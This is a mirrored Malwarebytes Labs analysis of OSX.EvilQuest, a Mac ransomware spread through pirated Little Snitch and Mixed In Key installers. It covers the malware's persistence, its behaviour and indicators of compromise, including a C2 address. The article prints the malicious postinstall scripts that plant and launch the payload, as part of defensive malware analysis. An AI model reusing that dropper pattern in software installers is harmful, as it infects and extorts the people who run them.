<!DOCTYPE html>
<html lang="en">
<head>
    <title>
New Mac ransomware spreading through piracy - Malwarebytes Labs - linksfor.dev(s)    </title>
    <meta charset="utf-8">
    <link rel="alternate" type="application/rss+xml" title="Linksfor.dev(s) feed" href="https://linksfor.dev/feed.rss" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="google" value="notranslate">
    <link rel="stylesheet" type="text/css" href="/style.css" />
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
    <meta property="og:title" content="New Mac ransomware spreading through piracy - Malwarebytes Labs - linksfor.dev(s)"/>
    <meta property="article:author" content="Thomas Reed"/>
    <meta property="og:description" content="We analyze a new Mac ransomware that appears to encrypt user files with a bit of a time delay. The ransomware encrypts files with little strategy."/>
    <meta property="og:type" content="website"/>
    <meta property="og:url" content="https://blog.malwarebytes.com/mac/2020/06/new-mac-ransomware-spreading-through-piracy/"/>

<meta property="og:site_name" content="linksfor.dev(s)" />
</head>
<body>
    <div class="devring" style="background: #222">
        <div style="text-align:center">Explore other dev related sites in this ring. If you would like to join this ring <a href="https://devring.club">click here</a>.</div>
        <div class="grid">
            <div style="display: grid; grid-template-columns: .5fr 1fr 1fr 1fr; text-align: center;">
                <span class="devring-title"><a href="https://devring.club/">devring.club</a></span>
                <a href="https://devring.club/sites/1/prev" class="devring-previous">Previous</a>
                <a href="https://devring.club/random" class="devring-random">Random</a>
                <a href="https://devring.club/sites/1/next" class="devring-next">Next</a>
            </div>
        </div>
    </div>
    <div class="grid">
        <h1>
<a href="/" style="color:inherit">linksfor.dev(s)</a>
        </h1>
        <title>linksfor.dev(s) - New Mac ransomware spreading through piracy - Malwarebytes Labs</title>
<div class="readable">
        <h1>New Mac ransomware spreading through piracy - Malwarebytes Labs</h1>
            <div>by Thomas Reed</div>
            <div>Reading time: 11-14 minutes</div>
        <div>Posted here: 01 Jul 2020</div>
        <p><a href="https://blog.malwarebytes.com/mac/2020/06/new-mac-ransomware-spreading-through-piracy/">https://blog.malwarebytes.com/mac/2020/06/new-mac-ransomware-spreading-through-piracy/</a></p>
        <hr/>
<div id="readability-page-1" class="page"><div id="articleBody" itemprop="articleBody"> 
<p>A Twitter user going by the handle @beatsballert messaged me yesterday after learning of an apparently malicious Little Snitch installer available for download on a Russian forum dedicated to sharing torrent links. A post offered a torrent download for Little Snitch, and was soon followed by a number of comments that the download included malware. In fact, we discovered that not only was it malware, but a new Mac ransomware variant spreading via piracy.</p>



<figure><img data-attachment-id="43644" data-permalink="https://blog.malwarebytes.com/mac/2020/06/new-mac-ransomware-spreading-through-piracy/attachment/osx-evilquest-rutracker-post/" data-orig-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-rutracker-post.png" data-orig-size="2714,1554" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="OSX.EvilQuest-rutracker-post" data-image-description="" data-medium-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-rutracker-post-300x172.png" data-large-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-rutracker-post-600x344.png" src="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-rutracker-post-600x344.png" alt="" srcset="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-rutracker-post-600x344.png 600w, https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-rutracker-post-300x172.png 300w, https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-rutracker-post-1536x879.png 1536w, https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-rutracker-post-2048x1173.png 2048w" sizes="(max-width: 600px) 100vw, 600px"><figcaption>RUTracker post showing magnet link to malicious installer</figcaption></figure>



<h3>Installation</h3>



<p>Analysis of this installer showed that there was definitely something strange going on. To start, the legitimate Little Snitch installer is attractively and professionally packaged, with a well-made custom installer that is properly code signed. However, this installer was a simple Apple installer package with a generic icon. Worse, the installer package was pointlessly distributed inside a disk image file.</p>



<figure><img data-attachment-id="43645" data-permalink="https://blog.malwarebytes.com/mac/2020/06/new-mac-ransomware-spreading-through-piracy/attachment/osx-evilquest-installer/" data-orig-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer.png" data-orig-size="1764,1096" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="OSX.EvilQuest-installer" data-image-description="" data-medium-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer-300x186.png" data-large-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer-600x373.png" src="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer-600x373.png" alt="" srcset="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer-600x373.png 600w, https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer-300x186.png 300w, https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer-1536x954.png 1536w, https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer.png 1764w" sizes="(max-width: 600px) 100vw, 600px"><figcaption>Malicious Little Snitch installer</figcaption></figure>



<p>Examining this installer revealed that it would install what turned out to be the legitimate Little Snitch installer and uninstaller apps, as well as an executable file named “patch”, into the <code>/Users/Shared/</code> directory.</p>



<figure><img data-attachment-id="43646" data-permalink="https://blog.malwarebytes.com/mac/2020/06/new-mac-ransomware-spreading-through-piracy/attachment/osx-evilquest-installer-2/" data-orig-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer-2.png" data-orig-size="1134,244" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="OSX.EvilQuest-installer-2" data-image-description="" data-medium-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer-2-300x65.png" data-large-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer-2-600x129.png" src="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer-2-600x129.png" alt="" srcset="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer-2-600x129.png 600w, https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer-2-300x65.png 300w, https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-installer-2.png 1134w" sizes="(max-width: 600px) 100vw, 600px"><figcaption>Files installed</figcaption></figure>



<p>The installer also contained a postinstall script—a shell script that is executed after the installation process is completed. It is normal for this type of installer to contain preinstall and/or postinstall scripts, for preparation and cleanup, but in this case the script was used to load the malware and then launch the legitimate Little Snitch installer.</p>



<pre>!/bin/sh
mkdir /Library/LittleSnitchd

mv /Users/Shared/Utils/patch /Library/LittleSnitchd/CrashReporter
rmdir /Users/Shared/Utils

chmod +x /Library/LittleSnitchd/CrashReporter

/Library/LittleSnitchd/CrashReporter
open /Users/Shared/LittleSnitchInstaller.app &amp;</pre>



<p>The script moves the <code>patch</code> file into a location that appears to be related to LittleSnitch and renames it to <code>CrashReporter</code>. As there is a legitimate process that is part of macOS named Crash Reporter, this name will blend in reasonably well if seen in Activity Monitor. It then removes itself from the <code>/Users/Shared/</code> folder and launches the new copy. Finally, it launches the Little Snitch installer.</p>



<p>In practice, this didn’t work very well. The malware got installed, but the attempt to run the Little Snitch installer got hung up indefinitely, until I eventually forced it to quit. Further, the malware didn’t actually start encrypting anything, despite the fact that I let it run for a while with some decoy documents in position as willing victims.</p>



<p>While waiting for the malware to do something—anything!—further investigation turned up an additional malicious installer, for some DJ software called Mixed In Key 8, as well as hints that a malicious Ableton Live installer also exists (although such an installer has not yet been found). There are undoubtedly other installers floating around as well that have not been seen.</p>



<p>The Mixed In Key installer turned out to be quite similar, though with slightly different file names and postinstall script.</p>



<pre>!/bin/sh
mkdir /Library/mixednkey

mv /Applications/Utils/patch /Library/mixednkey/toolroomd
rmdir /Application/Utils

chmod +x /Library/mixednkey/toolroomd

/Library/mixednkey/toolroomd &amp;</pre>



<p>This one did not include code to launch a legitimate installer, and simply dropped the Mixed In Key app into the Applications folder directly.</p>



<h3>Infection</h3>



<p>Once the infection was triggered by the installer, the malware began spreading itself quite liberally around the hard drive. Both variants installed copies of the <code>patch</code> file at the following locations:</p>



<pre>/Library/AppQuest/com.apple.questd
/Users/user/Library/AppQuest/com.apple.questd
/private/var/root/Library/AppQuest/com.apple.questd</pre>



<p>It also set up persistence via launch agent and daemon plist files:</p>



<pre>/Library/LaunchDaemons/com.apple.questd.plist
/Users/user/Library/LaunchAgents/com.apple.questd.plist
/private/var/root/Library/LaunchAgents/com.apple.questd.plist</pre>



<p>The latter in each group of files, found in <code>/private/var/root/</code>, is likely to be due to a bug in the code that creates the files in the user folder, leading to creation of the files in the root user’s folder. Since it’s quite rare for anyone to actually log in as root, this doesn’t serve any practical purpose.</p>



<p>Strangely, the malware also copied itself to the following files:</p>



<pre>/Users/user/Library/.ak5t3o0X2
/private/var/root/Library/.5tAxR3H3Y</pre>



<p>The latter was identical to the original <code>patch</code> file, but the former was modified in a very strange way. It contained a copy of the <code>patch</code> file, with a second copy of the data from that file appended to the end, followed by an additional 9 bytes: the hexidecimal string <code>03705701 00CEFAAD DE</code>. It is not yet known what the purpose of these files or this additional appended data is.</p>



<p>Even more bizarre—and still inexplicable—was the fact that the malware also modified the following files:</p>



<pre>/Users/user/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Helpers/crashpad_handler
/Users/user/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Helpers/GoogleSoftwareUpdateDaemon
/Users/user/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Helpers/ksadmin
/Users/user/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Helpers/ksdiagnostics
/Users/user/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Helpers/ksfetch
/Users/user/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Helpers/ksinstall</pre>



<p>These files are all executable files that are part of GoogleSoftwareUpdate, which are most commonly found installed due to having Google Chrome installed on the machine. These files had the content of the <code>patch</code> file prepended to them, which of course would mean that the malicious code would run when any of these files is executed. However, Chrome will see that the files have been modified, and will replace the modified files with clean copies as soon as it runs, so it’s unclear what the purpose here is.</p>



<h3>Behavior</h3>



<p>The malware installed via the Mixed In Key installer was similarly reticent to start encrypting files for me. I left it running on a real machine for some time with no results, then started playing with the system clock. After setting it ahead three days, disconnecting from the network, and restarting the computer a couple times, it finally began encrypting files.</p>



<p>The malware wasn’t particularly smart about what files it encrypted, however. It appeared to encrypt a number of settings files and other data files, such as the keychain files. This resulted in an error message when logging in post-encryption.</p>



<figure><img data-attachment-id="43647" data-permalink="https://blog.malwarebytes.com/mac/2020/06/new-mac-ransomware-spreading-through-piracy/attachment/osx-evilquest-keychain-error/" data-orig-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-keychain-error.png" data-orig-size="552,186" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="OSX.EvilQuest-keychain-error" data-image-description="" data-medium-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-keychain-error-300x101.png" data-large-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-keychain-error.png" src="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-keychain-error.png" alt="" srcset="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-keychain-error.png 552w, https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-keychain-error-300x101.png 300w" sizes="(max-width: 552px) 100vw, 552px"><figcaption>Error displayed after the keychain was encrypted by the ransomware</figcaption></figure>



<p>There were other very obvious indications of error, such as the Dock resetting to its default appearance.</p>



<p>The Finder also began showing signs of trouble, with spinning beachballs frequently appearing when selecting an encrypted file. Other apps would also freeze periodically, but the Finder freezes could only be managed by force quitting the Finder.</p>



<p>Although others have reported that a file is created with instructions on paying the ransom, as well as an alert shown, and even text-to-speech used to inform the user they have been infected with ransomware, I was unable to duplicate any of these, despite waiting quite a while for the ransomware to finish.</p>



<figure><img data-attachment-id="43648" data-permalink="https://blog.malwarebytes.com/mac/2020/06/new-mac-ransomware-spreading-through-piracy/attachment/osx-evilquest-ransom-alert/" data-orig-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-ransom-alert.png" data-orig-size="862,648" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="OSX.EvilQuest-ransom-alert" data-image-description="" data-medium-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-ransom-alert-300x226.png" data-large-file="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-ransom-alert-600x451.png" src="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-ransom-alert-600x451.png" alt="" srcset="https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-ransom-alert-600x451.png 600w, https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-ransom-alert-300x226.png 300w, https://blog.malwarebytes.com/wp-content/uploads/2020/06/OSX.EvilQuest-ransom-alert.png 862w" sizes="(max-width: 600px) 100vw, 600px"><figcaption>Screenshot of encryption message posted to RUTracker forum</figcaption></figure>



<h3>Capabilities</h3>



<p>The malware includes some anti-analysis techniques, found in functions named <code>is_debugging</code> and <code>is_virtual_mchn</code>. This is common with malware, as having a debugger attached to the process or being run inside a virtual machine are both indications that a malware researcher is analyzing it. In such cases, malware will typically not display its full capabilities.</p>



<p>In a <a rel="noreferrer noopener" href="https://objective-see.com/blog/blog_0x59.html" target="_blank">blog post on Objective-See</a>, Patrick Wardle outlined the details of how these two routines work. The <code>is_virtual_mchn</code> function actually does not appear to check to see if the malware is running in a virtual machine, but rather tries to catch a VM in the process of adjusting time. It’s not unusual for malware to include delays. For example, the first ever Mac ransomware, KeRanger, included a three day delay between when it infected the system and when it began encrypting files. This helps to disguise the source of the malware, as the malicious behavior may not be immediately associated with a program installed three days before.</p>



<p>This, plus the fact that the malware includes functions with names like <code>ei_timer_create</code>, <code>ei_timer_start</code>, and <code>ei_timer_check</code>, probably means that the malware runs on a time delay, although it’s not yet known what that delay is.</p>



<p>Patrick also points out that the malware appears to include a keylogger, due to presence of calls to CGEventTapCreate, which is a system routine that allows for monitoring of events like keystrokes. What the malware does with this capability is not known. It also opens a reverse shell to a command and control (C2) server.</p>



<h3>Open questions</h3>



<p>There are still a number of open questions that will be answered through further analysis. For example, what kind of encryption does this malware use? Is it secure, or will it be easy to crack (as in the case of <a rel="noreferrer noopener" href="https://blog.malwarebytes.com/cybercrime/2017/02/decrypting-after-a-findzip-ransomware-infection/" target="_blank">decrypting files encrypted by the FindZip ransomware</a>)? Will it be reversible, or is the encryption key never communicated back to the criminals behind it (also like FindZip)?</p>



<p>There’s still more to be learned, and we will update this post as more becomes known.</p>



<h3>Post-infection</h3>



<p>If you get infected with this malware, you’ll want to get rid of it as quickly as possible. Malwarebytes for Mac will detect this malware as Ransom.OSX.EvilQuest and remove it.</p>



<p>If your files get encrypted, we’re not sure how dire a situation that is. It depends on the encryption and how the keys are handled. It’s possible that further research could lead to a method for decrypting files, and it’s also possible that won’t happen.</p>



<p>The best way of avoiding the consequences of ransomware is to maintain a good set of backups. Keep at least two backup copies of all important data, and at least one should <em><strong>not</strong></em> be kept attached to your Mac at all times. (Ransomware may try to encrypt or damage backups on connected drives.)</p>



<p>I personally have multiple hard drives for backups. I use Time Machine to maintain a couple, and Carbon Copy Cloner to maintain a couple more. One of the backups is always in the safe deposit box at the bank, and I swap them periodically, so that worst case scenario, I always have reasonably recent data stored in a safe location.</p>



<p>If you have good backups, ransomware is no threat to you. At worst, you can simply erase the hard drive and restore from a clean backup. Plus, those backups also protect you against things like drive failure, theft, destruction of your device, etc.</p>



<h3>Indicators of Compromise</h3>



<h4>Files</h4>



<pre>patch (and com.apple.questd)
5a024ffabefa6082031dccdb1e74a7fec9f60f257cd0b1ab0f698ba2a5baca6b

Little Snitch 4.5.2.dmg
f8d91b8798bd9d5d348beab33604a540e13ce40b88adc096c8f1b3311187e6fa

Mixed In Key 8.dmg
b34738e181a6119f23e930476ae949fc0c7c4ded6efa003019fa946c4e5b287a</pre>



<h4>Network</h4>



<pre>C2 server 167.71.237.219
C2 address obtained from andrewka6.pythonanywhere[.]com</pre>
</div></div></div>
    </div>
    <footer>
        <div>created by buildstarted &copy; 2020 <a href="/about">about</a></div>
        <div>Share this page on social media: copy and paste this url https://linksfor.dev/</div>
        <div>If you prefer RSS: <a href="https://linksfor.dev/feed.xml">https://linksfor.dev/feed.xml</a></div>
        <div>Customer satisfaction guaranteed to be optional.</div>
    </footer>
    
    <script async defer>
        _dna = window._dna || {};
        _dna.siteId = "linksfor.devs";
        _dna.outlink = true;

        (function () {
            let dna = document.createElement('script');
            dna.type = 'text/javascript';
            dna.async = true;
            dna.src = '//dna.buildstarted.com/t.js';
            let s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(dna, s);
        })();
    </script>
    <noscript><img src="//dna.buildstarted.com/g?siteId=linksfor.devs" /></noscript>
</body>
</html>